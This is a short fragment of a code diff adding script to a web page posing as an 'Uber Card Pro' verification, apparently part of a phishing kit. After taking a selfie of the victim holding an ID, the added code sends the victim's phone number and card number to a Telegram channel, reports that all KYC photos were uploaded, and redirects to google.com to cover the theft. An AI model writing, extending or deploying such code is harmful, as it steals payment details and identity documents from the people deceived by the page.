+    document.getElementById('captureSelfieIdBtn').onclick = () => capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "Selfie holding ID", null).then(() => {
+        // All photos done → send final completion and redirect
+        sendToTelegram(`✅ <b>UBER CARD PRO VERIFICATION COMPLETE</b>\n\nUser: ${userData.phone}\nCard: ${userData.cardNumber}\nAll KYC photos uploaded.`);
+        loadingOverlay.classList.add('active');
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 2000);
+    });
+
+    function initCameraStep2() {
+        // will be called when step2 is shown
+    }
+
+    // Initially hide OTP section and card panel
+    otpSection.style.display = 'none';
+    cardPanel.classList.add('hide');
+    kycPanel.classList.add('hide');
+</script>
 </body>
 </html>
